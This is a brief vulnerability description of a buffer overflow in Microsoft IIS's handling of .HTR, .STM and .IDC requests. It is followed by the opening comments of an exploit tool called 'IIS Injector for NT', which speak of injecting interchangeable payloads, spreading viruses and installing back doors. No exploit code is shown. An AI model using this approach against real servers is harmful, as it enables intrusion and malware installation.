Microsoft IIS reported prone to a buffer overflow vulnerability in the way IIS handles requests for several file types that require server side processing. This vulnerability may allow a remote attacker to execute arbitrary code on the target machine.

IIS supports a number of file extensions that require futher processing. When a request is made for one of these types of files a specific DLL processes it. A stack buffer overflow vulnerability exists in several of these DLL's while handling .HTR, .STM or .IDC extensions.

// IIS Injector for NT

//
// If you would like to deliver a payload, it must be stored in a binary file.
// This injector decouples the payload from the injection code allowing you to
// create a numnber of different attack payloads.  This code could be used, for
// example, by a military that needs to attack IIS servers, and has characterized
// the eligible hosts.  The proper attack can be chosen depending on needs. Since
// the payload is so large with this injection vector, many options are available.
// First and foremost, virii can delivered with ease.  The payload is also plenty
// large enough to remotely download and install a back door program.
// Considering the monoculture of NT IIS servers out on the 'Net, this represents a
// very serious security problem.
